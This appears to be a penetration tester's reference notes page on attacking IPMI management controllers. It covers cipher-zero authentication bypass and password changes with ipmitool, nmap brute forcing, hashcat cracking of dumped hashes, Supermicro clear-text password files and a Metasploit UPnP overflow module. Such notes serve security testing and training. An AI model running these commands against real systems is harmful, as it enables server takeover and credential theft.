---
id: Exploitation
aliases: []
tags:
  - Networking/Services/IPMI/Exploitation
---

# Exploitation

___

<!-- Authentication {{{-->
## Authentication

<!-- Authentication Bypass {{{-->
### Authentication Bypass

[[ipmitool]] — List and change user passwords

List users

```sh
ipmitool -I lanplus -C 0 -H $target -U root -P root user list
```

Change password

```sh
ipmitool -I lanplus -C 0 -H $target -U <user> -P <password> user set password 2 <new_password>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Default Credentials {{{-->
### Default Credentials

It may be possible to log in using the
[[Networking/Services/IPMI/General#Dangerous Settings|default passwords]]

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> ### IPMI
>
> Usernames
>
> - [[Metasploit]] - [ipmi_users.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/ipmi_users.txt)
>
> ```sh
> /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
> ```
>
> Passwords
>
> - [[Metasploit]] - [ipmi_passwords.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/ipmi_passwords.txt)
>
> ```sh
> /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
> ```
> ### IDRAC
>
> Usernames
>
> - [[Metasploit]] - [idrac_default_user.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/idrac_default_user.txt)
>
> ```sh
> /usr/share/metasploit-framework/data/wordlists/idrac_default_user.txt
> ```
>
> Passwords
>
> - [[Metasploit]] - [idrac_default_pass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/idrac_default_pass.txt)
>
> ```sh
> /usr/share/metasploit-framework/data/wordlists/idrac_default_pass.txt
> ```
<!-- }}} -->

[[Nmap]] — Brute force password auditing against IPMI RPC server
(*[ipmi-script-brute](https://nmap.org/nsedoc/scripts/ipmi-brute.html)*)

```sh
nmap -sU $target -p 623 --script ipmi-brute -oA ipmi-script-brute
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Hash Cracking {{{-->
## Hash Cracking

Crack [[Enumeration#Dump Hashes|dumped hashes]]

<!-- Identify {{{-->
### Identify

Identify dumped hashes

[[Hashcat]] — [[Hashcat#Identify Hash|Identify Hash]]

```sh
hashcat identify <hash.txt>
```

<!-- }}} -->

<!-- Crack {{{-->
### Crack

Crack dumped hashes

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> [[Rockyou#Wordlist|Rockyou]]
>
> ```sh
> /usr/share/wordlists/rockyou.txt
> ```
<!-- }}} -->

[[Hashcat]] — [[Hashcat#Usage|Crack Hash]]

```sh
hashcat -m 7300 <ipmi_hash.txt> <rockyou.txt>
```

[[Hashcat]] — HP iLO hash cracking

```sh
hashcat -m 7300 <ipmi_hash.txt> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

<!-- Tip {{{-->
> [!tip]
>
> It may be possible to
> - [[Networking/Services/SSH/General|SSH]] into the many critical servers
>   as the `root` user
> - Gain access to the web management console
>   of various network monitoring tools
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Supermicro {{{-->
## Supermicro

<!-- Clear-text Passwords {{{-->
### Clear-text Passwords

Supermicro stores clear-text passwords

- `/nv/PSBlock`
- `/nv/PSStore`

> [!example]-
>
> ```sh
> cat /nv/PSBlock
> ```
> ```sh
>   admin                      ADMINpassword^TT                    rootOtherPassword!
> ```

<!-- }}} -->

<!-- UPnP Vulnerability {{{-->
### UPnP Vulnerability

Supermicro includes a vulneraple UPnP SSDP listener on UDP port `1900`

[[Metasploit]] — Portable UPnP SDK `unique_service_name()` Remote Code Execution
(*[libupnp_ssdp_overflow](https://www.rapid7.com/db/modules/exploit/multi/upnp/libupnp_ssdp_overflow/)*)

```sh
use exploit/multi/upnp/libupnp_ssdp_overflow
```

> [!example]-
>
> Exploits a buffer overflow in the unique_service_name()
> function of libupnp's SSDP processor.
> The libupnp library is used across thousands of devices
> and is referred to as the Intel SDK for UPnP Devices
> or the Portable SDK for UPnP Devices.
>
> ```sh
> msf > use exploit/multi/upnp/libupnp_ssdp_overflow
> msf exploit(libupnp_ssdp_overflow) > show targets
>     ...targets...
> msf exploit(libupnp_ssdp_overflow) > set TARGET < target-id >
> msf exploit(libupnp_ssdp_overflow) > show options
>     ...show and set options...
> msf exploit(libupnp_ssdp_overflow) > exploit
> ```

<!-- }}} -->

___
<!-- }}} -->
